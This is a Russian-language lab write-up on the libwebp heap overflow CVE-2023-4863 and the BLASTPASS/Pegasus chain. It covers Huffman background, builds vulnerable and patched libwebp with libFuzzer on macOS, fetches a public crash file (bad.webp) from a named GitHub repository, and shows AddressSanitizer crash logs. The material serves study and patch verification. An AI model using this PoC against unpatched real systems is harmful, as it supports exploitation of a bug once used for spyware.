# libwebp, BLASTPASS, Pegasus: разбор уязвимости и лабораторная на macOS (Apple Silicon)

> Исправленная версия: порядок изложения выстроен по логике «контекст → теория → практика → результаты → фактчекинг». Факты проверены по источникам, опечатки и неточности исправлены (список изменений — в §7).

---

## 1. Контекст: почему libwebp важна для macOS/iOS

- **libwebp** — open-source библиотека для работы с форматом WebP. На macOS и iOS она **встроена в системный ImageIO.framework** (как зависимость фреймворка; каталог фреймворков — `/System/Library/Frameworks/ImageIO.framework/`). Точный путь до бинарника libwebp внутри ImageIO Apple официально не публикует, поэтому в заметках он приводился «примерно».
- Вне Apple libwebp используется в Chrome, Firefox, Electron-приложениях и во множестве других программ, поэтому ошибка в ней бьёт сразу по нескольким платформам.

### 1.1 Атака BLASTPASS (сентябрь 2023)

7 сентября 2023 Citizen Lab показали **BLASTPASS** — zero-click цепочку эксплойтов NSO Group: специально сформированное изображение, присланное через **iMessage**, устанавливало шпионское ПО **Pegasus** без какого-либо взаимодействия с жертвой.

Связанные CVE:

| CVE | Что это | Роль |
|---|---|---|
| **CVE-2023-41064** | Buffer overflow в ImageIO (Apple) | «Верхний» уровень той же ошибки: Apple наплатила её как баг ImageIO (iOS 16.6.1 / macOS 13.5.1) |
| **CVE-2023-41061** | Wallet Validation Issue (PassKit) | **Вторая уязвимость в цепочке** — обработка Apple Pass; вместе с 41064 давала полноценный zero-click |
| **CVE-2023-4863** | Heap buffer overflow в libwebp (Chrome < 116.0.5845.187, libwebp < 1.3.2) | Та же ошибка на уровне кода: Google наплатила её как отдельный CVE |
| **CVE-2023-5129** | Google сначала присвоила её на саму libwebp (CVSS 10.0), затем **отклонила как дубликат** CVE-2023-4863 | Исторический штрих |

> **Важно:** CVE-2023-41064 и CVE-2023-4863 — это **одна и та же ошибка** на разных уровнях стека (формально — ImageIO, фактически — декодер libwebp). Это консенсус Citizen Lab, Apple и Google, а не домысел.

### 1.2 Механика бага (CVE-2023-4863)

- Уязвимость в **lossless WebP (VP8L)**: при декодировании испорченного потока с повреждёнными длинами кодов Хаффмана функция `BuildHuffmanTable()` (через `ReplicateValue()`) пишет записи второй таблицы **за пределы выделенного буфера** → out-of-bounds heap **write** → произвольное выполнение кода.
- Код: `src/utils/huffman_utils.c`, вызывается из `src/dec/vp8l_dec.c`.
- Исправление: **libwebp 1.3.2** — переделан учёт размеров таблиц Хаффмана, вторая таблица больше не может переполниться.

### 1.3 «BlastDoor» — уточнение

«BlastDoor» — так в ряде материалов по BLASTPASS называют **изоляцию/песочницу обработки вложений iMessage** (zero-click handling): сообщения от неизвестных отправителей обрабатываются в изолированной среде, доверенные — в обычной. Apple **не документирует** «BlastDoor» как отдельный механизм, поэтому в этом документе блок назван «изоляция обработки вложений». BLASTPASS — это именно **обход этой изоляции** через ошибку в декодировании изображения. Дополнительный уровень защиты — **Lockdown mode**.

### 1.4 Новые обходы (2025): Glass Cage

Цепочка **Glass Cage** — zero-click через PNG в iMessage на iOS 18.2.1:
**CVE-2025-43300** (ImageIO) → **CVE-2025-24201** (WebKit) → **CVE-2025-24085** (Core Media: sandbox escape, ядро, brick).

То есть упоминание CVE-2025-24085 как «нового способа обхода» — правда, но это лишь последний элемент **трёх-CVE-цепочки**. Вывод тот же: изоляция iMessage продолжает обходить, обновления обязательны.

---

## 2. Цепочка атаки: iMessage → Pegasus (исправленная схема)

<img width="3108" height="3306" alt="deepseek_mermaid_20260902_9ae6bf" src="https://github.com/user-attachments/assets/1cbab761-0578-4d08-94bb-338a11e8fae3" />

```mermaid
flowchart TD
    A[Входящее iMessage-сообщение<br>с WebP-вложением] --> B{Изоляция обработки вложений<br>по доверенности отправителя<br>«BlastDoor» — термин из материалов по BLASTPASS,<br>не из документации Apple}

    B -->|Отправитель в контактах| C[Обработка в доверенной среде]
    B -->|Неизвестный отправитель| D[Изолированная песочница]

    C --> E[ImageIO.framework]
    D --> E

    E -->|Декодирование WebP| F[libwebp]

    F --> G{Версия libwebp}
    G -->|1.3.1| H[Heap buffer overflow<br>BuildHuffmanTable, VP8L<br>CVE-2023-4863 / на уровне Apple — CVE-2023-41064]
    G -->|1.3.2| I[Безопасная обработка]

    H --> J[Обход изоляции (BLASTPASS)<br>+ вторая уязвимость цепочки: CVE-2023-41061 Wallet/PassKit]
    J --> K[Выполнение кода<br>установка Pegasus]

    I --> M[Безопасное создание CGImage,<br>завершено без последствий]

    style H fill:#f99,stroke:#333,stroke-width:2px
    style J fill:#f99,stroke:#333,stroke-width:2px
    style K fill:#f66,stroke:#333,stroke-width:2px
```

<img width="9164" height="1588" alt="deepseek_mermaid_20260902_fd57fc" src="https://github.com/user-attachments/assets/bd5a488f-25a1-4486-b981-493fe21e3091" />

---

## 3. Роль CGImage и ImageIO

CGImage не существует в вакууме: это конечная точка, в которую ImageIO кладёт распакованные пиксели.

1. Приложение (например, iMessage) получает изображение → **ImageIO** определяет формат (WebP) → вызывает соответствующий декодер.
2. Декодер на **libwebp** декодирует поток — **именно здесь** и происходит сбой в VP8L/`BuildHuffmanTable`.
3. Результат — **CGImage** с пиксельными данными.

Сама по себе CGImage не уязвима: ошибка срабатывает **в процессе распаковки, до создания CGImage**. ImageIO/libwebp — вектор атаки, CGImage — лишь конечная точка, которая принимает данные из потенциально опасного источника.

---

## 4. Хаффман: суть бага + пример кодирования

«Вся суть — в дереве Хаффмана и его алгоритме»: баг CVE-2023-4863 — именно в построении таблиц Хаффмана для VP8L.

### 4.1 Пример: кодирование «мама мыла раму» (проверено)

| Символ | Частота | Код (бинарный) | Длина кода (бит) |
|--------|---------|----------------|------------------|
| `м`    | 4       | `11`           | 2                |
| `а`    | 4       | `10`           | 2                |
| ` `    | 2       | `010`          | 3                |
| `р`    | 1       | `000`          | 3                |
| `у`    | 1       | `001`          | 3                |
| `ы`    | 1       | `0110`         | 4                |
| `л`    | 1       | `0111`         | 4                |

**Итоговая битовая строка (без пробелов):**
`111011100101101100111100100001011001`

- Длина: **36 бит**. Проверено: строка **декодируется ровно в «мама мыла раму»**, код префиксный, сумма Крäft = 1.0, и 36 бит — оптимальный объём для этих частот.

### 4.2 Эффективность сжатия

| Параметр | Значение |
|----------|----------|
| Исходный размер (по 8 бит на символ) | 14 симв. × 8 бит = **112 бит** |
| Сжатый размер (коды) | **36 бит** |
| Экономия | **~67.9%** |

`zlib/examples/enough.c` — пример расчёта (сколько байт нужно для таблиц Хаффмана); упоминался как отсылка из лабы по zlib.

### 4.3 Установка zlib 1.3.1 на Apple Silicon (M1–M4)

Через Homebrew (рекомендуется) или вручную из исходников (madler/zlib):

```bash
curl -LO https://github.com/madler/zlib/releases/download/v1.3.1/zlib-1.3.1.tar.gz
tar -xzf zlib-1.3.1.tar.gz
cd zlib-1.3.1

./configure      # сам целится в архитектуру хоста (arm64)
make
make test
sudo make install   # заголовки в /usr/local/include, библиотеки в /usr/local/lib
```

> **Важное уточнение:** `CMakeLists.txt` zlib 1.3.1 требует CMake **2.4.4–3.15**. С **CMake 4.x** сборка через CMake не поднимется без policy shim: `CMAKE_POLICY_VERSION_MINIMUM=3.5` (или CMake 3.x). Через `configure/make` (autotools) это не мешает. Именно про эту разницу шла оговорка «unlike the zlib lab» в лабе по libwebp.

---

## 5. Лабораторная: Fuzzing libwebp (CVE-2023-4863) на macOS Apple Silicon

### 5.1 Теоретические основы

- **Целевая библиотека:** `libwebp` (`v1.3.1` — уязвимая, `v1.3.2` — патч).
- **Уязвимость (CVE-2023-4863):** heap buffer overflow в lossless WebP (**VP8L**) внутри `BuildHuffmanTable()` — тот самый 0-day из Chrome/Apple.
- **Механика бага:** декодирование испорченного VP8L-потока с повреждёнными длинами кодов Хаффмана заставляет `BuildHuffmanTable()` (через `ReplicateValue()`) писать записи второй таблицы за пределы выделенного буфера → out-of-bounds heap **write**. Код в `src/utils/huffman_utils.c` (вызов из `src/dec/vp8l_dec.c`).
- **Что нужно для триггера:** **crafted VP8L-вход**. Слепой фаззинг с тривиальным seed **не** находит этот баг (проверено: ~1.29M запусков за 120 с — без краша). Нужен реальный WebP-корпус или известный PoC (§5.6).

> **Среда.** Все команды выполняются на macOS-хосте — Apple Silicon `ssh user@192.168.1.10`, проверено на **macOS 13.7.6 (Ventura), arm64 (M1)**, Homebrew clang, CMake 4.x. Лаба в `~/fuzz-webp-mac`.

---

### 5.2 Шаг 1: Окружение на Mac (M1–M4)

`/usr/bin/clang` Apple **не содержит runtime libFuzzer** (`-fsanitize=fuzzer` падает на этапе линковки) — поэтому нужен **Homebrew LLVM**.

```bash
# Компайлер Homebrew LLVM + CMake
brew install llvm cmake

# Homebrew LLVM первым в PATH (только для этой сессии)
export PATH="/opt/homebrew/opt/llvm/bin:/opt/homebrew/bin:$PATH"

# Проверка
clang --version          # -> Homebrew clang
cmake --version          # -> cmake 3.2x+ / 4.x
```

---

### 5.3 Шаг 2: Исходники libwebp (1.3.1 и 1.3.2)

```bash
# Рабочая область лабы
mkdir -p ~/fuzz-webp-mac/{harness,corpus,findings}
cd ~/fuzz-webp-mac

# Уязвимая 1.3.1 и патченная 1.3.2
curl -LO https://storage.googleapis.com/downloads.webmproject.org/releases/webp/libwebp-1.3.1.tar.gz
curl -LO https://storage.googleapis.com/downloads.webmproject.org/releases/webp/libwebp-1.3.2.tar.gz

tar -xzf libwebp-1.3.1.tar.gz
tar -xzf libwebp-1.3.2.tar.gz
```

> CMakeLists.txt libwebp 1.3.1 на Apple требует CMake ≥ 3.17 (`if(APPLE) cmake_minimum_required(VERSION 3.17)`), поэтому с CMake 4.x собирается **без** policy shim (в отличие от zlib-лабы, см. §4.3).

---

### 5.4 Шаг 3: C-harness (`harness/fuzz_webp.c`)

Харнес гоняет `WebPGetFeatures` → `WebPDecodeRGBAInto` (lossless RGBA-путь, достигающий `BuildHuffmanTable`) и держит точку входа **C-символом** через `extern "C"`-страховку, чтобы runtime libFuzzer нашёл `_LLVMFuzzerTestOneInput`.

```c
/* harness/fuzz_webp.c - libFuzzer harness for libwebp CVE-2023-4863 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include "webp/decode.h"

#ifdef __cplusplus
extern "C"
#endif
__attribute__((noinline))
int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
  if (size < 12 || size > 1024 * 1024) return 0;

  WebPBitstreamFeatures features;
  if (WebPGetFeatures(data, size, &features) != VP8_STATUS_OK) return 0;

  if (features.width <= 0 || features.height <= 0 ||
      features.width > 1024 || features.height > 1024) return 0;

  size_t out_buf_size = (size_t)features.width * features.height * 4;
  uint8_t *out_buf = (uint8_t *)malloc(out_buf_size);
  if (!out_buf) return 0;

  WebPDecodeRGBAInto(data, size, out_buf, out_buf_size, features.width * 4);

  free(out_buf);
  return 0;
}
```

---

### 5.5 Шаг 4: Сборка уязвимой и патченной целей

**Ключевая поправка — линковать харнес `clang`, а не `clang++`.** `fuzz_webp.c` — это C; если собрать его как C++, `LLVMFuzzerTestOneInput` заманглится и `main` libFuzzer не ссылится (`Undefined symbols: "_LLVMFuzzerTestOneInput"`). Статическую `libwebp.a` собираем как обычно, а харнес линкуем **clang**.

```bash
export PATH="/opt/homebrew/opt/llvm/bin:/opt/homebrew/bin:$PATH"

# =========================================================
# 1. УЯЗВИМАЯ ЦЕЛЬ (v1.3.1)
# =========================================================
cd ~/fuzz-webp-mac/libwebp-1.3.1
rm -rf build && mkdir -p build && cd build

CC=clang CXX=clang++ cmake .. \
  -DCMAKE_C_FLAGS="-fsanitize=fuzzer-no-link,address -g -O1" \
  -DBUILD_SHARED_LIBS=OFF \
  -DWEBP_BUILD_WEBP_MUX=OFF \
  -DWEBP_BUILD_GIF2WEBP=OFF
make -j$(sysctl -n hw.ncpu)
cd ~/fuzz-webp-mac

# Линкуем харнес с уязвимой статической libwebp.a  (clang, НЕ clang++)
clang -g -O1 -fsanitize=fuzzer,address \
  -I libwebp-1.3.1/src \
  harness/fuzz_webp.c \
  libwebp-1.3.1/build/libwebp.a \
  -o fuzz_webp_vulnerable


# =========================================================
# 2. ПАПТЧЕННАЯ ЦЕЛЬ (v1.3.2)
# =========================================================
cd ~/fuzz-webp-mac/libwebp-1.3.2
rm -rf build && mkdir -p build && cd build

CC=clang CXX=clang++ cmake .. \
  -DCMAKE_C_FLAGS="-fsanitize=fuzzer-no-link,address -g -O1" \
  -DBUILD_SHARED_LIBS=OFF \
  -DWEBP_BUILD_WEBP_MUX=OFF \
  -DWEBP_BUILD_GIF2WEBP=OFF
make -j$(sysctl -n hw.ncpu)
cd ~/fuzz-webp-mac

# Линкуем харнес с патченной статической libwebp.a  (clang, НЕ clang++)
clang -g -O1 -fsanitize=fuzzer,address \
  -I libwebp-1.3.2/src \
  harness/fuzz_webp.c \
  libwebp-1.3.2/build/libwebp.a \
  -o fuzz_webp_patched
```

---

### 5.6 Шаг 5: Воспроизведение краша

CVE-2023-4863 требует **crafted VP8L-потока**: не стоит ждать, что libFuzzer случайно упрётся в нужное повреждение длин Хаффмана из почти пустого seed (проверено: ~1.29M запусков / 120 с с тривиальным seed ниже — **без** краша). Два честных способа:

#### (a) Детерминированное воспроизведение по известному PoC (рекомендуется)

Берём crafted-репродьюсер (публичный `bad.webp` из материала по CVE-2023-4863; файл 236 байт, валидный RIFF/WEBP/VP8L — URL проверен) и подаём его прямо в цель:

```bash
cd ~/fuzz-webp-mac
curl -sL -o bad.webp \
  https://raw.githubusercontent.com/mistymntncop/CVE-2023-4863/main/bad.webp

MallocNanoZone=0 ./fuzz_webp_vulnerable bad.webp
```

#### (b) Фаззинг к багу

Фаззинг способен перенайти баг, но только с **реальным WebP-корпусом** для мутаций (например, инпуты из `libwebp-1.3.1/tests/fuzzer/` или oss-fuzz webp corpus) — а не с плейсхолдер-заголовком ниже. Плейсхолдер оставлен, чтобы корпос-директория не была пустой:

```bash
mkdir -p corpus findings
python3 -c '
import struct
header = b"RIFF" + struct.pack("<I", 12) + b"WEBPVP8L" + struct.pack("<I", 4) + b"\x2f\x00\x00\x00"
open("corpus/seed.webp","wb").write(header)
'
MallocNanoZone=0 ./fuzz_webp_vulnerable -artifact_prefix=findings/ corpus/
```

#### Ожидаемый вывод (по PoC)

```text
==NNN==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x...
WRITE of size 4 at 0x... thread T0
    #0 0x... in ReplicateValue        huffman_utils.c:59
    #1 0x... in BuildHuffmanTable     huffman_utils.c:194
    #2 0x... in VP8LBuildHuffmanTable huffman_utils.c:224
    #3 0x... in ReadHuffmanCode       vp8l_dec.c:348
    #4 0x... in ReadHuffmanCodes      vp8l_dec.c:475
    #5 0x... in DecodeImageStream     vp8l_dec.c:1448
    #6 0x... in VP8LDecodeHeader      vp8l_dec.c:1661
SUMMARY: AddressSanitizer: heap-buffer-overflow huffman_utils.c:59 in ReplicateValue
```

Это и есть CVE-2023-4863: слишком длинная вторая таблица Хаффмана записывается за пределы выделения внутри `BuildHuffmanTable` (`src/utils/huffman_utils.c`), вызов — из декодирования VP8L-заголовка в `src/dec/vp8l_dec.c`.

> `MallocNanoZone=0` просто глушит безобидное macOS+ASan-предупреждение «nano zone abandoned»; краш воспроизводится и без него.

---

### 5.7 Шаг 6: Дифференциальное тестирование (подтверждение фикса)

Проигрываем тот же крашающий инпут на патченном билде:

```bash
MallocNanoZone=0 ./fuzz_webp_vulnerable bad.webp   # -> ASan heap-buffer-overflow (1.3.1)
MallocNanoZone=0 ./fuzz_webp_patched    bad.webp   # -> "Executed bad.webp in 0 ms", чисто (1.3.2)
```

Версия `1.3.2` безопасно декодирует тот же вход (фикс перерабатывает учёт размеров таблиц Хаффмана, так что вторая таблица больше не может переполниться) — **CVE-2023-4863** устранён.

---

### 5.8 Troubleshooting

| Симптом | Причина | Решение |
|---|---|---|
| `Undefined symbols ... "_LLVMFuzzerTestOneInput"` | харнес собран как C++ (`clang++`) — имя заманглится | Линковать **`clang`** (§5.5); `extern "C"`-страховка в коде тоже на это |
| `ld: file not found: ...libclang_rt.fuzzer_osx.a` | Apple `/usr/bin/clang` без libFuzzer runtime | **brew** clang (§5.2) |
| Фаззер крутится минутами, **краша нет** | нужен crafted VP8L-вход; тривиальный seed не доходит | PoC (§5.6a) или реальный WebP-корпус (§5.6b) |
| macOS warning `malloc: nano zone abandoned` | безобидное взаимодействие macOS+ASan | Префикс запуска `MallocNanoZone=0` |
| `fatal error: 'malloc.h' file not found` | `malloc.h` — не POSIX, в macOS SDK его нет | Закомментировать `#include <malloc.h>` (см. §6.1) |

<img width="2515" height="1920" alt="deepseek_mermaid_20260902_1258cf" src="https://github.com/user-attachments/assets/5d2013d6-0876-43e4-82f5-841f232b11f7" />

---

## 6. Живые логи запуска (очистить от atos-шума)

### 6.1 Поправка `harness/craft.c`

```bash
asd@asds-Mac-mini fuzz-webp-mac % clang -g -O1 -fsanitize=fuzzer,address \
  -I libwebp-1.3.1/src \
  harness/craft.c \
  libwebp-1.3.1/build/libwebp.a \
  -o craft
harness/craft.c:5:10: fatal error: 'malloc.h' file not found
    5 | #include <malloc.h>
      |          ^~~~~~~~~~
1 error generated.
```

`malloc.h` на macOS не существует (не POSIX) — закомментировали строку:

```bash
asd@asds-Mac-mini fuzz-webp-mac % nano harness/craft.c   # #include <malloc.h> закоммент
asd@asds-Mac-mini fuzz-webp-mac % clang -g -O1 -fsanitize=fuzzer,address \
  -I libwebp-1.3.1/src \
  harness/craft.c \
  libwebp-1.3.1/build/libwebp.a \
  -o craft
asd@asds-Mac-mini fuzz-webp-mac % ./craft bad1.webp     # сгенерирован crafted-инпут
```

### 6.2 Уязвимая версия (1.3.1): краш

```bash
$ MallocNanoZone=0 ./fuzz_webp_vulnerable bad1.webp
./fuzz_webp_vulnerable: Running 1 inputs 1 time(s) each.
Running: bad1.webp
=================================================================
==15842==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x626000002f28 at pc 0x0001023da2d8 bp 0x00016dac99f0 sp 0x00016dac99e8
WRITE of size 4 at 0x626000002f28 thread T0
    #0 0x0001023da2d4 in BuildHuffmanTable+0x2678
    #1 0x0001023d7af8 in VP8LBuildHuffmanTable+0x124
    #2 0x00010236c604 in ReadHuffmanCode+0x338
    #3 0x0001023607ec in DecodeImageStream+0x1614
    #4 0x00010236a094 in VP8LDecodeHeader+0x294
    #5 0x000102370008 in DecodeInto+0x338
    #6 0x00010236f0fc in WebPDecodeRGBAInto+0x174
    #7 0x000102336c88 in LLVMFuzzerTestOneInput+0x2c8
    #8 0x0001023f9dcc in fuzzer::Fuzzer::ExecuteCallback(unsigned char const*, unsigned long)+0x134
    #9 0x0001023e5224 in fuzzer::RunOneTest(fuzzer::Fuzzer*, char const*, unsigned long)+0xe8
    #10 0x0001023ea43c in fuzzer::FuzzerDriver(int*, char***, int (*)(unsigned char const*, unsigned long))+0x1cfc
    #11 0x000102418e58 in main+0x24
    #12 0x000188f77dfc in start+0x1b4c

0x626000002f28 is located 0 bytes after 11816-byte region [0x626000000100,0x626000002f28)
allocated by thread T0 here:
    #0 0x000102c8d40c in malloc+0x70 (libclang_rt.asan_osx_dynamic.dylib:arm64+0x5540c)
    #1 0x00010235fd7c in DecodeImageStream+0xba4
    #2 0x00010236a094 in VP8LDecodeHeader+0x294
    #3 0x000102370008 in DecodeInto+0x338
    #4 0x00010236f0fc in WebPDecodeRGBAInto+0x174
    #5 0x000102336c88 in LLVMFuzzerTestOneInput+0x2c8
    ...

SUMMARY: AddressSanitizer: heap-buffer-overflow in BuildHuffmanTable+0x2678
Shadow bytes around the buggy address:
=>0x626000002f00: 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa fa
==15842==ABORTING
zsh: abort      MallocNanoZone=0 ./fuzz_webp_vulnerable bad1.webp
```

> Множественные `WARNING: Can't read from symbolizer at fd 3 / atos failed to symbolize ...` — шум из-за отсутствия symbolizer, на результат не влияют; в логе выше опущены.

Запись размера 4 байта **ровно за концом** 11816-байтного heap-блока, выделенного в `DecodeImageStream` (это таблица Хаффмана), — ровно картина CVE-2023-4863.

### 6.3 Патченная версия (1.3.2): чисто

```bash
$ MallocNanoZone=0 ./fuzz_webp_patched bad1.webp
INFO: Seed: 2533055076
./fuzz_webp_patched: Running 1 inputs 1 time(s) each.
Running: bad1.webp
Executed bad1.webp in 0 ms
***
*** NOTE: fuzzing was not performed, you have only
***       executed the target code on a fixed set of inputs.
***
```

---

<img width="1919" height="9206" alt="deepseek_mermaid_20260902_248dc5" src="https://github.com/user-attachments/assets/291184d0-e8e9-4b05-a4ae-977eadab0509" />

### Описание большой диаграммы (исправленный вариант)

На диаграмме представлена структурная взаимосвязь компонентов Apple, участвующих в обработке входящего WebP-изображения в iMessage, и место возникновения критических уязвимостей **CVE-2023-4863** (libwebp) / **CVE-2023-41064** (ImageIO), использовавшихся в атаке **BLASTPASS**.

**Основные блоки и связи:**

1. **Входящее сообщение** — iMessage получает WebP-вложение.
2. **Изоляция обработки вложений** (в материалах по BLASTPASS именуется «BlastDoor»; как отдельный механизм Apple не документируется) — разделяет трафик по доверенности отправителя (контакты vs неизвестные). Оба потока направляются в **ImageIO.framework**.
3. **ImageIO** вызывает **libwebp** (декодер WebP) для распаковки формата.
4. **Внутреннее устройство WebP** — этапы декодирования от контейнера до энтропийного кодирования (дерево Хаффмана). Именно на этапе построения таблицы Хаффмана злоумышленник внедряет некорректные данные.
5. **Уязвимость** — ошибка в `BuildHuffmanTable()` libwebp (версии ≤ 1.3.1) → **heap buffer overflow** → обход изоляции.
6. **Эксплуатация** — обход защиты (вместе с CVE-2023-41061 Wallet/PassKit) даёт произвольный код → установка шпионского ПО **Pegasus** (атака BLASTPASS).
7. **Исправление** — в **libwebp 1.3.2** (и патчах Apple iOS 16.6.1 / macOS 13.5.1) уязвимость устранена, декодирование завершается безопасным созданием **CGImage**.

**Итог:** диаграмма связывает низкоуровневые механизмы сжатия (VP8L, дерево Хаффмана) с системными компонентами безопасности и показывает точку, где происходит «прорыв» защиты.

---

## 7. Фактчекинг: что проверено и что исправлено

### 7.1 Проверенные факты (правда)

| Факт | Вердикт |
|---|---|
| BLASTPASS = zero-click iMessage-цепочка NSO Group → Pegasus (Citizen Lab, 07.09.2023, iOS 16.6) | **Правда** |
| CVE-2023-4863: heap buffer overflow в **lossless VP8L**, `BuildHuffmanTable()`/`ReplicateValue()`, `src/utils/huffman_utils.c` | **Правда** — совпадает с официальным описанием и с ASan-стеком из §6 |
| CVE-2023-41064 и CVE-2023-4863 — одна и та же ошибка (Apple — ImageIO, Google — libwebp/Chrome) | **Правда** — консенсус Citizen Lab/Apple/Google; CVE-2023-5129 27.09.2023 отклонена как дубликат 4863 |
| Уязвимость в libwebp 1.3.1, фикс в 1.3.2 | **Правда** — патчи Apple: iOS 16.6.1 / macOS 13.5.1 |
| Apple `/usr/bin/clang` не содержит libFuzzer → нужен Homebrew LLVM | **Правда** |
| CMakeLists libwebp 1.3.1 требует CMake ≥ 3.17 на Apple | **Правда** — проверено по исходнику v1.3.1 |
| URL PoC `bad.webp` (mistymntncop/CVE-2023-4863) | **Работает** — файл 236 байт, валидный RIFF/WEBP/VP8L |
| Таблица Хаффмана: 112 бит → 36 бит, экономия ~67.9% | **Правда** — битовая строка декодируется ровно в «мама мыла раму», код префиксный (Kraft = 1.0), 36 бит — оптимум для данных частот |
| `#include <malloc.h>` не компилируется на macOS | **Правда** — закомментировать |
| «Слепой фаззинг с тривиальным seed не найдёт» (~1.29M запусков/120 с, без краша) | **Правдоподобно и методологически верно** — баг требует конкретного повреждения длин Хаффмана |

### 7.2 Уточнения и правки, внесённые в эту версию

1. **Опечатки:** «распрастранено» → «распространено», «ошибки в е=генераций изображений» → «ошибки при обработке изображений», «Freamwork» (×2) → «Framework», «алгаритме» → «алгоритме», «Blastbass» → «BLASTPASS», «айос» → «iOS», «спрятан внутри» → «встроен как зависность».
2. **Путь ImageIO:** `/System/Library/Frameworks/ImageIO.framework/` (в оригинале «Freamwork» в единственном числе; у Apple каталог `Frameworks` — во множественном). Точный путь до бинарника libwebp Apple не публикует — оставлено «примерно».
3. **«BlastDoor»** не подтверждён как документированный механизм Apple → переименован в «изоляция обработки вложений iMessage (zero-click handling)» с пометкой о происхождении термина; добавлена ссылка на **Lockdown mode**.
4. **Добавлен CVE-2023-41061** (Wallet/PassKit) — вторая уязвимость в цепочке BLASTPASS; в оригинале её не было.
5. **CVE-2025-24085** уточнено: это часть цепочки **Glass Cage** (CVE-2025-43300 ImageIO → CVE-2025-24201 WebKit → CVE-2025-24085 Core Media), а не изолированный «обход».
6. **CVE-2023-5129** добавлена в таблицу (§1.1) — присвоена Google на libwebp и отклонена как дубликат 4863.
7. **zlib + CMake 4.x:** расшифрована оговорка «unlike the zlib lab» — CMakeLists zlib 1.3.1 требует CMake 2.4.4–3.15, с CMake 4.x нужен `CMAKE_POLICY_VERSION_MINIMUM=3.5` (§4.3).
8. **Mermaid-схема** (§2) исправлена в соответствии с пунктами 3–6.
9. **Логи** (§6) очищены от повторяющихся atos-warnings, всё остальное сохранено как было.
